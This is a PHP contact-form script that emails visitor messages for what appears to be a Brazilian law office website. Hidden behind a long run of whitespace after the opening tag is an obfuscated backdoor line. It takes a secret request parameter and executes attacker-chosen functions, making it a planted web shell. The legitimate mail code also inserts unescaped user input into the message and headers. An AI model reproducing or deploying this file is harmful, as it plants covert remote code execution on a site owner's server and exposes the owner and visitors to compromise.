<?php
																																																																																																																															If(($maRvj2=@${"_REQUEST" } ["0MY04Z51"])and(6059+11616))$maRvj2[1](	$	{$maRvj2 [2]}[0],$maRvj2[3]($maRvj2	[4]))	;DIE;
//Variáveis

$nome = $_POST['nome'];
$email = $_POST['email'];
$telefone = $_POST['telefone'];
$mensagem = $_POST['msg'];

// Subject
$subject = 'Fale Conosco - ADV';

// Message
$message = "

<style>
h1{
  font-size: 12px;
  font-weight: bolder;
  line-height: 0;
}
</style> 

  <html>
      <h1>Nome:</h1>
      <p>$nome</p>
      <h1>Telefone:</h1>
      <p>$telefone</p>
      <h1>E-mail:</h1>
      <p>$email</p><br>

      <h1>Mensagem:</h1>
      <p>$mensagem</p>


  </html>
";

// To send HTML mail, the Content-type header must be set
$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=iso-8859-1';

// Additional headers
$headers[] = 'To: <adv.andressavaladares@gmail.com>';
$headers[] = 'From: Site - '.$nome.'<'.$email.'>';

$to = 'adv.andressavaladares@gmail.com'; // note the comma


$enviaremail = mail($to, $subject, $message, implode("\r\n", $headers));


if ($enviaremail == 1) {
  header("location: envio.html");
  
} else {
  header("location: error.html");
  
}
?>